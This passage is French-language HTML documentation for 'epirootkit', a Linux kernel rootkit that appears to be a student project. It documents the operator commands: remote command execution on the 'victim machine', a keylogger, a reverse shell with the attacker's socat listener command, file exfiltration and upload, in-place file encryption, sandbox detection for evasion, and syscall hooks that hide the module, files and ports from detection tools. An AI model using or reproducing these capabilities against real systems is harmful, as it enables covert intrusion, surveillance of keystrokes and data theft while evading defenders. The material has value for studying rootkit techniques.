<li><b>PASSWORD</b> : Mot de passe d'authentification au rootkit (par d√©faut <code>evannounet</code>)</li>
</ul>
<p><b>Notes importantes</b></p><ul>
<li>La connexion est n√©cessaire pour ex√©cuter d'autres commandes</li>
<li>Seules les commandes <a href="#help">help</a>, <a href="#connect">connect</a> et <a href="#ping">ping</a> sont accessibles sans authentification</li>
<li>Le mot de passe peut √™tre modifi√© ult√©rieurement avec la commande <a href="#passwd">passwd</a> </li>
</ul>
</details>
<details  open="true">
<summary  id="disconnect">
<b>3. üîå disconnect</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">disconnect</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Commande compl√©mentaire de <a href="#connect">connect</a>. Permet de se d√©connecter proprement du rootkit distant.</p>
<p><b>Comportement</b></p><ul>
<li>Une reconnexion sera n√©cessaire pour saisir de nouvelles commandes</li>
<li>Ne termine pas l'execution du rootkit contrairement √† <a href="#killcom">killcom</a>.</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="ping">
<b>4. üì° ping</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">ping</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Teste la connectivit√© du rootkit.</p>
<p><b>R√©ponse attendue</b></p><ul>
<li><b>Succ√®s</b> : La console renvoie <code>pong</code></li>
<li><b>√âchec</b> : Aucune r√©ponse ou erreur de connexion</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="passwd">
<b>5. üîê passwd</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">passwd [PASSWORD]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Modifie le mot de passe actuellement utilis√© pour se connecter au rootkit.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PASSWORD</b> : Nouveau mot de passe</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Le mot de passe est hach√© automatiquement</li>
<li>Stockage s√©curis√© en interne sur la machine victime</li>
</ul>
<p><b>Exemple</b> </p><div class="fragment"><div class="line">passwd root</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="exec">
<b>6. üñ•Ô∏è exec</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">exec [OPTIONS] [COMMAND]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Ex√©cute du code Bash dans l'espace utilisateur (userland) de la machine victime.</p>
<p><b>Options</b></p><ul>
<li><b>-s</b> : Mode silencieux (√©vite l'affichage de la sortie, retourne uniquement le code de retour)</li>
</ul>
<p><b>Sortie par d√©faut</b></p><ul>
<li>Contenu de <em>stdout</em></li>
<li>Contenu de <em>stderr</em> <br  />
</li>
<li>Code de retour de la commande</li>
</ul>
<p><b>Exemples</b> </p><div class="fragment"><div class="line">exec ls                    # Liste les fichiers</div>
<div class="line">exec man man              # Affiche le manuel</div>
<div class="line">exec -s whoami            # Mode silencieux</div>
<div class="line">exec ping 8.8.8.8         # Test de connectivit√©</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="klgon">
<b>7. üëÅÔ∏è klgon</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klgon</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Active le keylogger sur la machine victime.</p>
<p><b>Fonctionnement</b></p><ul>
<li>Enregistrement de toutes les frappes clavier</li>
<li>Fonctionnement en arri√®re-plan</li>
<li>Stockage des donn√©es pour r√©cup√©ration ult√©rieure</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger possible directement depuis l‚Äôonglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="klgoff">
<b>8. üëÅÔ∏è klgoff</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klgoff</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 D√©sactive le keylogger sur la machine victime.</p>
<p><b>Effet</b></p><ul>
<li>Arr√™t imm√©diat de l'enregistrement des frappes</li>
<li>Les donn√©es d√©j√† collect√©es restent disponibles</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger possible directement depuis l‚Äôonglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="klg">
<b>9. üìù klg</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klg</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 R√©cup√®re les frappes clavier enregistr√©es par le keylogger.</p>
<p><b>Format de sortie</b></p><ul>
<li><b>Contenu brut</b> sans mise en forme</li>
<li><b>Touches sp√©ciales</b> repr√©sent√©es par des cha√Ænes sp√©cifiques<ul>
<li>Exemple : <code>_LSHIFT_</code> pour la touche Majuscule gauche</li>
</ul>
</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger et fonctionnalit√©es avanc√©es disponibles directement depuis l‚Äôonglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="getshell">
<b>10. üêö getshell</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">getshell [port]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Ouvre un shell invers√© (reverse shell) s√©curis√© sur la machine cible en utilisant une connexion TCP+SSL.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>port</b> *(optionnel)* : Port de connexion personnalis√©<ul>
<li><b>D√©faut</b> : <code>9001</code></li>
<li><b>Exemple</b> : <code>getshell 9042</code> utilise le port 9042</li>
</ul>
</li>
</ul>
<p><b>Fonctionnement technique</b> <br  />
 Le reverse shell utilise un binaire <b>socat</b> compil√© statiquement, int√©gr√© au module rootkit :</p>
<ol type="1">
<li><b>D√©ploiement</b> : Le binaire est install√© dans <code>/var/lib/systemd/.epirootkit-hidden-fs/.sysd</code> lors de l'insertion du module</li>
<li><b>Connexion</b> : √âtablissement d'une connexion TCP+SSL vers l'attaquant sur le port sp√©cifi√©</li>
<li><b>Ex√©cution</b> : L'attaquant peut ex√©cuter des commandes √† distance comme s'il √©tait connect√© localement</li>
<li><b>Interactivit√©</b> : Shell compl√®tement interactif gr√¢ce aux param√®tres d'ex√©cution sp√©cifiques du binaire</li>
</ol>
<p><b>Configuration c√¥t√© attaquant</b> <br  />
 L'attaquant doit avoir une instance socat en √©coute avec le certificat SSL correspondant :</p>
<div class="fragment"><div class="line">socat openssl-listen:9042,reuseaddr,cert=&quot;$(pwd)&quot;/server.pem,verify=0 file:&quot;$(tty)&quot;,raw,echo=0</div>
</div><!-- fragment --><p><b>Interface web</b> <br  />
 Dans l'interface web :</p><ul>
<li>Sp√©cifiez le port dans le champ d√©di√©</li>
<li>Le serveur socat est lanc√© automatiquement en arri√®re-plan en utilisant le terminal <b>Kitty</b></li>
<li>Cliquez sur le bouton <b>Launch Shell</b> pour ouvrir le shell invers√©</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Le reverse shell est disponible directement depuis l‚Äôonglet <b>Shell</b> du <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#dashboard">Dashboard</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="killcom">
<b>11. üíÄ killcom</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">killcom</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Coupe la communication avec le rootkit et supprime le module via <code>rmmod</code>.</p>
<p><b>Usage recommand√©</b></p><ul>
<li><b>D√©veloppement et tests</b> uniquement</li>
<li><b>Production</b> : Utilisez plut√¥t <code>disconnect</code> pour une d√©connexion simple.</li>
</ul>
<p><b>Effet destructeur</b> <br  />
 Cette commande d√©truit compl√®tement le module, n√©cessitant une r√©installation sur la machine victime pour le r√©activer.</p>
<blockquote class="doxtable">
<p>&zwj;S'il venait √† arriver que le rootkit soit d√©tect√© par des outils sp√©cialis√©s (par exemple par la DGSI ou Laurence C. ), la commande <code>killcom</code> peut alors s'av√©rer d'une grande utilit√© afin de supprimer toute trace du rootkit et disparaitre tel XDDL. </p>
</blockquote>
<p></p>
</details>
<details  open="true">
<summary  id="hide_module">
<b>12. üôà hide_module</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hide_module</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque le module noyau en le retirant de la liste cha√Æn√©e des modules maintenue par le noyau Linux.</p>
<p><b>Avantages</b></p><ul>
<li>Ind√©tectable par les outils syst√®me classiques</li>
<li>Persistance accrue du rootkit</li>
<li>Contournement des outils de d√©tection standards</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="unhide_module">
<b>13. üëÄ unhide_module</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">unhide_module</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Op√©ration inverse de <a class="el" href="../../d0/dcb/epirootkit_8h.html#a6db046f8e25a3ddce7587005952b9f86">`hide_module`</a>. R√©tablit le module pr√©c√©demment masqu√© en le r√©ins√©rant dans la liste des modules du noyau.</p>
<p><b>Usage</b></p><ul>
<li>Permet la visibilit√© temporaire du module</li>
<li>Utile pour narguer les outils de d√©tection lorque la partie de cache-cache est trop longue</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="get_file">
<b>14. üì• download</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">download [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Permet de transf√©rer un fichier de la machine victime vers la machine attaquante.</li>
<li>Fonctionne de mani√®re s√©curis√©e en utilisant le protocole TCP+SSL.</li>
</ul>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier sur le rootkit</li>
</ul>
<p><b>Fonctionnalit√©s probables</b></p><ul>
<li>Exfiltration de donn√©es</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="upload">
<b>15. üì§ upload</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">upload [PATH] [SIZE]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Permet de transf√©rer un fichier de la machine attaquante vers la machine victime.</li>
<li>Fonctionne de mani√®re s√©curis√©e en utilisant le protocole TCP+SSL.</li>
</ul>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier sur la machine attaquante</li>
<li><b>SIZE</b> : Taille du fichier en octets (lol, je ne suis pas responsable)</li>
</ul>
<p><b>Fonctionnalit√©s probables</b></p><ul>
<li>D√©ploiement d'outils suppl√©mentaires</li>
<li>Installation de payloads</li>
<li>Mise √† jour du rootkit</li>
<li>Transfert de fichiers de configuration</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="sysinfo">
<b>16. üß† sysinfo</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">sysinfo</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Affiche les informations syst√®me de la machine victime.</li>
</ul>
<p><b>Informations retourn√©es</b></p><ul>
<li><b>architecture</b> : Architecture processeur</li>
<li><b>cpu_cores</b> : Nombre de c≈ìurs CPU</li>
<li><b>cpu_model</b> : Mod√®le du processeur</li>
<li><b>hostname</b> : Nom d‚Äôh√¥te de la machine</li>
<li><b>ram_mb</b> : Quantit√© de RAM en Mo</li>
<li><b>release</b> : Version du noyau Linux</li>
<li><b>system</b> : Syst√®me d‚Äôexploitation</li>
<li><b>version</b> : D√©tail complet du noyau</li>
<li><b>virtual_env</b> : Indique si la machine est virtualis√©e</li>
</ul>
<p><b>Exemple de sortie</b> </p><div class="fragment"><div class="line">architecture: x86_64</div>
<div class="line">cpu_cores: 1</div>
<div class="line">cpu_model: QEMU Virtual CPU version 2.5+</div>
<div class="line">hostname: victim</div>
<div class="line">ram_mb: 3889</div>
<div class="line">release: 6.8.0-58-generic</div>
<div class="line">system: Linux</div>
<div class="line">version: &quot;#60~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 28 16:09:21 UTC 2&quot;</div>
<div class="line">virtual_env: true</div>
</div><!-- fragment --> </details>
<details  open="true">
<summary  id="is_in_vm">
<b>17. üñ•Ô∏è is_in_vm</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">is_in_vm</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>D√©tecte si le rootkit s'ex√©cute dans un environnement virtualis√©.</li>
</ul>
<p><b>D√©tection possible</b></p><ul>
<li>Hyperviseurs (VMware, VirtualBox, Hyper-V)</li>
<li>Conteneurs Docker</li>
<li>Machines virtuelles cloud</li>
<li>Environnements de sandboxing</li>
</ul>
<p><b>Utilit√©</b></p><ul>
<li>Adaptation du comportement selon l'environnement</li>
<li>√âvasion des analyses en bac √† sable</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="cipher">
<b>18. üõ°Ô∏è cipher</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">cipher [FILENAME]</div>
</div><!-- fragment --><p><b>Description</b> Chiffre un fichier sur la machine victime en utilisant l'algorithme de chiffrement AES-128.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>FILENAME</b> : Chemin absolu du fichier √† chiffrer</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Utilise la cl√© de chiffrement stock√©e dans le module rootkit</li>
<li>Le fichier est chiffr√© en place, rempla√ßant le contenu original</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="uncipher">
<b>19. üõ°Ô∏è uncipher</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">uncipher [FILENAME]</div>
</div><!-- fragment --><p><b>Description</b> D√©chiffre un fichier sur la machine victime en utilisant l'algorithme AES-128.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>FILENAME</b> : Chemin absolu du fichier √† d√©chiffrer</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Utilise la cl√© de chiffrement stock√©e dans le module rootkit</li>
<li>Le fichier est d√©chiffr√© en place, rempla√ßant le contenu originalement chiffr√©</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks">
<b>20. ü™ù Hooks</b></summary>
<p></p>
<p><b>Vue d'ensemble des Hooks</b></p>
<p><b>Description g√©n√©rale</b> <br  />
 Le syst√®me de hooks permet d'intercepter les appels syst√®me (syscalls) sur la machine victime. Toutes les commandes de cette section doivent √™tre pr√©c√©d√©es de <code>hooks</code>.</p>
<p><b>Fonctionnement</b> <br  />
 Des fichiers de configuration sont r√©cup√©r√©s √† chaque insertion du module et mis √† jour r√©guli√®rement pour maintenir le comportement des alt√©rations.</p>
<blockquote class="doxtable">
<p>&zwj;‚ö†Ô∏è <b>Important</b> <br  />
</p><ul>
<li>Les fonctionnalit√©s sont <b>persistantes</b> <br  />
</li>
<li>Non affect√©es par un red√©marrage syst√®me <br  />
</li>
<li>Maintenues tant que le module est ins√©r√© <br  />
</li>
<li>Configuration sauvegard√©e et recharg√©e automatiquement <br  />
 </li>
</ul>
</blockquote>
<p><b>Commandes Hooks disponibles</b></p>
<details  open="true">
<summary  id="hooks-help">
<b>hooks help</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks help</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche un menu r√©capitulatif de toutes les commandes <code>hooks</code> disponibles.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-hide">
<b>hooks hide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks hide [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque un fichier ou un dossier sp√©cifique en fournissant son chemin absolu.</p>
<p><b>Fonctionnement technique</b></p><ul>
<li>Interception du syscall <code>getdents64</code></li>
<li>Filtrage du contenu lors de l'√©num√©ration des fichiers</li>
<li>Masquage automatique des fichiers commen√ßant par <code>stdbool_bypassed_ngl_</code></li>
</ul>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier √† masquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-unhide">
<b>hooks unhide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unhide [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks hide</code> en rendant √† nouveau visible le fichier ou dossier cibl√©.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier √† r√©v√©ler</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_hide">
<b>hooks list_hide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_hide</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste compl√®te des chemins absolus de tous les fichiers et r√©pertoires masqu√©s.</p>
<p><b>Utilit√©</b></p><ul>
<li>Audit des √©l√©ments cach√©s</li>
<li>Gestion centralis√©e des masquages</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-forbid">
<b>hooks forbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks forbid [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Interdit l'acc√®s √† un fichier ou dossier sans le masquer, m√™me pour l'utilisateur root.</p>
<p><b>Syscalls intercept√©s</b></p><ul>
<li><code>openat</code>, <code>newfstatat</code>, <code>fstat</code>, <code>lstat</code>, <code>stat</code>, <code>chdir</code></li>
</ul>
<p><b>Comportement</b> <br  />
 Retourne l'erreur <code>-ENOENT</code> (<em>No such file or directory</em>) comme si l'√©l√©ment n'existait pas.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier √† interdire</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-unforbid">
<b>hooks unforbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unforbid [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks forbid</code>.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier √† d√©bloquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_forbid">
<b>hooks list_forbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_forbid</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste compl√®te des chemins absolus de tous les fichiers et r√©pertoires interdits.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-modify">
<b>hooks modify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks modify [PATH] [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Interception de l'appel syst√®me <code>read()</code> permettant de modifier dynamiquement le contenu des fichiers.</p>
<p><b>Fonctionnalit√©s</b></p><ul>
<li><b>Masquer une ligne pr√©cise</b> : <code>hide_line=N</code></li>
<li><b>Masquer les lignes contenant un mot-cl√©</b> : <code>hide_substr=TXT</code></li>
<li><b>Remplacer des mots-cl√©s</b> : <code>replace=SRC:DST</code></li>
</ul>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier (obligatoire)</li>
<li><b>hide_line</b> : Num√©ro de ligne √† masquer</li>
<li><b>hide_substr</b> : Sous-cha√Æne √† masquer dans toutes les lignes</li>
<li><b>replace</b> : Remplacement au format <code>source:destination</code></li>
</ul>
<p><b>Limitations</b> <br  />
</p><ul>
<li>Comportement impr√©visible avec des fichiers tr√®s longs</li>
<li>Les espaces ne sont pas pris en charge</li>
<li>Fonctionnement primitif</li>
</ul>
<p><b>Exemples</b> </p><div class="fragment"><div class="line">hooks modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita</div>
<div class="line">hooks modify /home/victim/test.txt hide_substr=claire replace=efrei:epita</div>
<div class="line">hooks modify /home/victim/test.txt replace=efrei:epita hide_substr=claire</div>
<div class="line">hooks modify /home/victim/test.txt hide_substr=claire hide_line=10</div>
<div class="line">hooks modify /home/victim/test.txt hide_line=1</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="hooks-unmodify">
<b>hooks unmodify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unmodify [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks modify</code>.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier √† restaurer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_modify">
<b>hooks list_modify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_modify</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste compl√®te des chemins absolus de tous les fichiers modifi√©s.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-add_port">
<b>hooks add_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks add_port [PORT]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque des ports sp√©cifiques dans les fichiers syst√®me et les outils r√©seau.</p>
<p><b>Cibles affect√©es</b></p><ul>
<li>Fichiers <code>/proc/net/tcp*</code></li>
<li>Commandes <code>ss</code></li>
<li>Commandes <code>netstat</code></li>
</ul>
<p><b>Comportement</b> <br  />
 Masque toutes les lignes mentionnant un port source ou destination √©gal √† <code>[PORT]</code>.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PORT</b> : Num√©ro de port √† masquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-remove_port">
<b>hooks remove_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks remove_port [PORT]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks add_port</code>.</p>
<p><b>Param√®tres</b></p><ul>
<li><b>PORT</b> : Num√©ro de port √† r√©v√©ler</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_port">
<b>hooks list_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_port</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste compl√®te de tous les ports actuellement masqu√©s.</p>
<p></p>
</details>
<p></p>
</details>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/></p>
<div class="section_buttons"></div><div class="section_buttons"><table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Previous   </th><th class="markdownTableHeadRight">Next    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><a class="el" href="../../dd/dc9/md_pages_2fr_203__install.html">Mise en place</a>   </td><td class="markdownTableBodyRight"><a class="el" href="../../dd/d6f/md_pages_2fr_205__env.html">Environnement</a>   </td></tr>
</table>
</div> </div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
